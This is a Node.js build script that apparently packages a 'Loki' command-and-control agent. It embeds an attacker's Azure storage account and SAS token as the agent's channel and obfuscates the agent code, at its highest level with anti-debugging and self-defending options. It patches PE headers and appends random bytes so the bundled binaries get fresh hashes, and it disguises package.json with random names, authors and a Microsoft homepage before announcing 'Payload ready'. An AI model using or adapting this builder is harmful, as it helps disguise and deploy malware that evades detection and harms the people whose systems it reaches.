function shuffleArray(array) {
    const result = [...array];
    for (let i = result.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [result[i], result[j]] = [result[j], result[i]];
    }
    return result;
}

// ---------- Helpers ----------
function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomVersion() {
    return `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`;
}

function generateMetaContainer() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = 'm';
    while (result.length < 13) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function promptInput(promptText) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise(resolve => rl.question(promptText, ans => {
        rl.close();
        resolve(ans.trim());
    }));
}

function hashFile(filePath) {
    const fileBuffer = fs.readFileSync(filePath);
    return crypto.createHash('sha256').update(fileBuffer).digest('hex');
}

async function changeNodeHashes() {
    console.log("[+] Modifying PE binaries to have new hashes...");
    // Load original PE binaries
    const assembly_buffer = fs.readFileSync(AssemblySrcPath);
    const scexec_buffer = fs.readFileSync(scexecSrcPath);

    // ----------- Assembly PE Modification -----------
    const assembly_peOffset = assembly_buffer.readUInt32LE(0x3C);
    const assembly_timestampOffset = assembly_peOffset + 8;
    const assembly_randomTime = Math.floor(Date.now() / 1000) - Math.floor(Math.random() * 100000);

    assembly_buffer.writeUInt32LE(assembly_randomTime, assembly_timestampOffset);
    // console.log('[+] Patched PE timestamp (assembly):', new Date(assembly_randomTime * 1000).toUTCString());
    const assembly_patches = [];
    for (let i = 0; i < 5; i++) {
        const offset = assembly_peOffset + 100 + Math.floor(Math.random() * 100);
        const value = crypto.randomBytes(1)[0];
        assembly_patches.push({ offset, value });
        assembly_buffer[offset] = value;
    }

    const assembly_optHeaderStart = assembly_peOffset + 24;
    if (assembly_buffer.length > assembly_optHeaderStart + 64) {
        assembly_buffer[assembly_optHeaderStart + 3] = crypto.randomBytes(1)[0];
        const newChecksum = crypto.randomBytes(4);
        assembly_buffer.writeUInt32LE(newChecksum.readUInt32LE(0), assembly_optHeaderStart + 64);
    }

    const assembly_junk = crypto.randomBytes(128 + Math.floor(Math.random() * 128));
    const assembly_newBuffer = Buffer.concat([assembly_buffer, assembly_junk]);

    fs.writeFileSync(AssemblyDstPath, assembly_newBuffer);

    // ----------- Scexec PE Modification -----------
    const scexec_peOffset = scexec_buffer.readUInt32LE(0x3C);
    const scexec_timestampOffset = scexec_peOffset + 8;
    const scexec_randomTime = Math.floor(Date.now() / 1000) - Math.floor(Math.random() * 100000);

    scexec_buffer.writeUInt32LE(scexec_randomTime, scexec_timestampOffset);
    //console.log('[+] Patched PE timestamp (scexec):', new Date(scexec_randomTime * 1000).toUTCString());

    const scexec_patches = [];
    for (let i = 0; i < 5; i++) {
        const offset = scexec_peOffset + 100 + Math.floor(Math.random() * 100);
        const value = crypto.randomBytes(1)[0];
        scexec_patches.push({ offset, value });
        scexec_buffer[offset] = value;
    }

    const scexec_optHeaderStart = scexec_peOffset + 24;
    if (scexec_buffer.length > scexec_optHeaderStart + 64) {
        scexec_buffer[scexec_optHeaderStart + 3] = crypto.randomBytes(1)[0];
        const newChecksum = crypto.randomBytes(4);
        scexec_buffer.writeUInt32LE(newChecksum.readUInt32LE(0), scexec_optHeaderStart + 64);
    }

    const scexec_junk = crypto.randomBytes(128 + Math.floor(Math.random() * 128));
    const scexec_newBuffer = Buffer.concat([scexec_buffer, scexec_junk]);

    fs.writeFileSync(scexecDstPath, scexec_newBuffer);

    const assembly_entropy = calculateEntropy(assembly_newBuffer);
    const scexec_entropy = calculateEntropy(scexec_newBuffer);

    console.log(`\t- Payload assembly.node hash: ${hashFile(AssemblyDstPath)}`);
    console.log(`\t- Payload keytar.node hash: ${hashFile(scexecDstPath)}`);

    if (isDebug) {
        console.log(`\t- Assembly binary entropy: ${assembly_entropy.toFixed(4)} bits/symbol`);
        console.log(`\t- Keytar binary entropy: ${scexec_entropy.toFixed(4)} bits/symbol`);
    }
}

function cleanup() {
    console.log("[+] Cleanup initiated.");
    // Cleanup node_modules and other files
    for (const target of cleanupTargets) {
        if (fs.existsSync(target)) {
            try {
                const stat = fs.lstatSync(target);
                if (stat.isDirectory()) {
                    fs.rmSync(target, { recursive: true, force: true });
                    if (isDebug) console.log(`Removed directory: ${target}`);
                } else {
                    fs.unlinkSync(target);
                    if (isDebug) console.log(`Removed file: ${target}`);
                }
            } catch (err) {
                console.warn(`Failed to remove ${target}:`, err.message);
            }
        }
    }
}

// ---------- Check for External Obfuscator ----------
let JavaScriptObfuscator;
let hasExternalObfuscator = false;

if (argMap.cleanup) {
    cleanup();
    process.exit(0);
}

try {
    JavaScriptObfuscator = require('javascript-obfuscator');
    hasExternalObfuscator = true;
    if (isDebug) console.log("Found external JavaScript obfuscator module.");
} catch (err) {
    if (err.code === 'MODULE_NOT_FOUND') {
        console.warn("'javascript-obfuscator' not found, using custom obfuscation techniques only.");
        hasExternalObfuscator = false;
    } else {
        throw err;
    }
}

// ---------- Reset Output Directory ----------
try {
    if (fs.existsSync(outputDir)) {
        fs.rmSync(outputDir, { recursive: true, force: true });
        if (isDebug) console.log("Deleted existing './app' directory.");
    }
    fs.mkdirSync(outputDir, { recursive: true });
    if (isDebug) console.log("Created new './app' directory.");

    // Create temp directory for parallel processing
    if (fs.existsSync(tempDir)) {
        fs.rmSync(tempDir, { recursive: true, force: true });
    }
    fs.mkdirSync(tempDir, { recursive: true });
} catch (err) {
    console.error("Error managing directories:", err.message);
    process.exit(1);
}

// ---------- Worker Process Handler ----------
if (cluster.isWorker) {
    process.on('message', async (message) => {
        const { filePath, outputPath, level, useExternal } = message;

        try {
            const code = fs.readFileSync(filePath, "utf-8");
            let obfuscatedCode = customObfuscate(code, level, Math.random());

            if (hasExternalObfuscator && useExternal) {
                const options = getExternalObfuscatorOptions(level);
                obfuscatedCode = JavaScriptObfuscator.obfuscate(
                    obfuscatedCode,
                    options
                ).getObfuscatedCode();
            }

            fs.writeFileSync(outputPath, obfuscatedCode);
            process.send({ success: true, filePath, outputPath });
        } catch (err) {
            process.send({ success: false, filePath, error: err.message });
        }
    });

    process.on('SIGTERM', () => {
        console.log(`Worker ${process.pid} received SIGTERM`);
        process.exit(0);
    });

    process.on('uncaughtException', (err) => {
        console.error(`Worker ${process.pid} uncaught exception:`, err);
        process.send({ success: false, error: err.message });
        process.exit(1);
    });
}

function getExternalObfuscatorOptions(level) {
    const options = {
        compact: true
    };

    switch (level) {
        case 'low':
            return {
                ...options,
                controlFlowFlattening: false,
                stringArrayEncoding: [],
                deadCodeInjection: false,
                stringArray: true,
                stringArrayThreshold: 0.5
            };

        case 'medium':
            return {
                ...options,
                controlFlowFlattening: true,
                controlFlowFlatteningThreshold: 0.5,
                deadCodeInjection: false,
                stringArray: true,
                stringArrayEncoding: ["base64"],
                stringArrayThreshold: 0.75
            };

        case 'high':
            return {
                ...options,
                controlFlowFlattening: true,
                controlFlowFlatteningThreshold: 0.75,
                deadCodeInjection: true,
                deadCodeInjectionThreshold: 0.4,
                stringArray: true,
                stringArrayEncoding: ["rc4"],
                stringArrayThreshold: 0.8,
                transformObjectKeys: true,
                numbersToExpressions: true
            };

        case 'extreme':
            return {
                ...options,
                controlFlowFlattening: true,
                controlFlowFlatteningThreshold: 1,
                deadCodeInjection: true,
                deadCodeInjectionThreshold: 0.7,
                debugProtection: true,
                debugProtectionInterval: 2000,
                stringArray: true,
                stringArrayEncoding: ["rc4"],
                stringArrayThreshold: 1,
                selfDefending: true,
                transformObjectKeys: true,
                numbersToExpressions: true,
                splitStrings: true,
                stringArrayWrappersCount: 5
            };
    }
}

// ---------- Process JS Files ----------
async function processJsFiles(jsFiles) {
    if (numWorkers <= 1 || jsFiles.length <= 1) {
        console.log(`[+] Processing ${jsFiles.length} JavaScript files sequentially...`);

        for (const file of jsFiles) {
            const sourcePath = path.join(sourceDir, file);
            const outputPath = path.join(outputDir, file);

            try {
                const startTime = performance.now();
                const code = fs.readFileSync(sourcePath, "utf-8");

                let obfuscatedCode = customObfuscate(code, obfuscationLevel);

                if (hasExternalObfuscator && useExternalObfuscator) {
                    const options = getExternalObfuscatorOptions(obfuscationLevel);
                    obfuscatedCode = JavaScriptObfuscator.obfuscate(
                        obfuscatedCode,
                        options
                    ).getObfuscatedCode();
                }

                fs.writeFileSync(outputPath, obfuscatedCode);

                if (isDebug) {
                    const duration = (performance.now() - startTime).toFixed(2);
                    console.log(`Obfuscated: ${file} (${duration}ms)`);
                }
            } catch (err) {
                console.error(`Error processing ${file}:`, err.message);
            }
        }

        return;
    }

    console.log(`[+] Processing ${jsFiles.length} JavaScript files with ${numWorkers} workers...`);

    return /** @type {Promise<void>} */(new Promise((resolve) => {
        let completedFiles = 0;
        let activeWorkers = 0;
        let currentFileIndex = 0;

        const setupWorker = () => {
            const worker = cluster.fork();
            activeWorkers++;

            worker.on('message', (message) => {
                completedFiles++;

                if (message.success) {
                    if (isDebug) console.log(`Obfuscated: ${path.basename(message.filePath)}`);
                } else {
                    console.error(`Error processing ${path.basename(message.filePath)}:`, message.error);
                }

                if (currentFileIndex < jsFiles.length) {
                    const file = jsFiles[currentFileIndex++];
                    const sourcePath = path.join(sourceDir, file);
                    const outputPath = path.join(outputDir, file);

                    worker.send({
                        filePath: sourcePath,
                        outputPath,
                        level: obfuscationLevel,
                        useExternal: useExternalObfuscator
                    });
                } else {
                    worker.kill();
                    activeWorkers--;

                    if (activeWorkers === 0 && completedFiles === jsFiles.length) {
                        resolve();
                    }
                }
            });

            if (currentFileIndex < jsFiles.length) {
                const file = jsFiles[currentFileIndex++];
                const sourcePath = path.join(sourceDir, file);
                const outputPath = path.join(outputDir, file);

                worker.send({
                    filePath: sourcePath,
                    outputPath,
                    level: obfuscationLevel,
                    useExternal: useExternalObfuscator
                });
            }
        };

        const workerCount = Math.min(numWorkers, jsFiles.length);
        for (let i = 0; i < workerCount; i++) {
            setupWorker();
        }
    }));
}

// ---------- Main Logic ----------
(async () => {
    try {
        // Generate realistic-looking dead code snippets
        // const deadCodeSnippets = generateDeadCodeSnippets();

        if (!argMap.token || !argMap.account || !argMap.meta) {
            console.log("[+] Provide Azure storage account information:");
        }
        const storageAccount = argMap.account || await promptInput("\t- Enter Storage Account : ");
        const sasToken = argMap.token || await promptInput("\t- Enter SAS Token : ");
        const metaContainer = argMap.meta || generateMetaContainer();

        console.log("\n[+] Configuration:");
        console.log("\t- Storage Account :", storageAccount);
        console.log("\t- SAS Token :", sasToken.substring(0, 10) + "...");
        console.log("\t- Meta Container :", metaContainer);
        console.log("\t- Obfuscation Level:", obfuscationLevel);

        const configContent = `module.exports = {
    storageAccount: '${storageAccount}',
    metaContainer: '${metaContainer}',
    sasToken: '${sasToken}'
};\n`;

        fs.writeFileSync(configSrcPath, configContent, 'utf-8');
        fs.copyFileSync(configSrcPath, configCopyPath);
        console.log(`\n[+] Updated ${configCopyPath} with storage configuration\r\n - Enter into the Loki Client UI\r\n\tLoki Client > Configuration\r\n`);

        // Collect all JS files first
        const jsFiles = [];
        const otherFiles = [];

        fs.readdirSync(sourceDir).forEach(file => {
            const sourcePath = path.join(sourceDir, file);

            if (fs.lstatSync(sourcePath).isFile()) {
                if (file.endsWith(".js")) {
                    jsFiles.push(file);
                } else {
                    otherFiles.push(file);
                }
            }
        });


        if (jsFiles.length > 0) {
            console.log(`[+] Found ${jsFiles.length} JavaScript files to obfuscate`);

            if (cluster.isMaster) {
                const startTime = performance.now();

                if (numWorkers > 1 && jsFiles.length > 1) {
                    await processJsFiles(jsFiles);

                    for (const id in cluster.workers) {
                        cluster.workers[id].kill();
                    }
                } else {
                    await processJsFiles(jsFiles);
                }

                console.log(`[+] Obfuscation completed in ${((performance.now() - startTime) / 1000).toFixed(2)}s`);
            }
        }

        otherFiles.forEach(file => {
            const sourcePath = path.join(sourceDir, file);
            const outputPath = path.join(outputDir, file);

            if (file.endsWith(".css") || file.endsWith(".html") || file === "assembly.node" || file === "keytar.node") {
                fs.copyFileSync(sourcePath, outputPath);
                if (isDebug) console.log(`Copied: ${file}`);
            }
        });

        if (cluster.isPrimary) {
            await changeNodeHashes();
        }
        process.exit(0);
    } catch (err) {
        console.error("Unexpected error during processing:", err.message);
        process.exit(1);
    }
})();

// ---------- Final Cleanup + Metadata ----------
process.on('exit', () => {
    if (cluster.isPrimary) {
        try {
            if (fs.existsSync(pkgSrcPath)) {
                const pkgData = JSON.parse(fs.readFileSync(pkgSrcPath, "utf-8"));
                delete pkgData.build;
                delete pkgData.dependencies;
                delete pkgData.devDependencies;

                pkgData.name = appNameArg || randomChoice(names);
                pkgData.version = randomVersion();
                pkgData.keywords = keywords.sort(() => Math.random() - 0.5).slice(0, 3 + Math.floor(Math.random() * 4));
                pkgData.author = randomChoice(authors);
                pkgData.description = randomChoice(descriptions);
                pkgData.license = randomChoice(licenses);
                pkgData.homepage = "https://www.microsoft.com";

                fs.writeFileSync(pkgDstPath, JSON.stringify(pkgData, null, 2), "utf-8");
                if (isDebug) console.log("package.json updated with custom values.");
                console.log(`\n[+] Payload ready!`);
                console.log(`\t - Obfuscated payload in the ./app directory`);
            } else {
                console.warn("No package.json found in ./agent/ directory.");
            }

            // Final cleanup if requested
            if (argMap.cleanup) {
                cleanup();
            }
            process.exit(0);
        } catch (err) {
            console.error("Failed to update package.json:", err.message);
            process.exit(1);
        }
    }
});
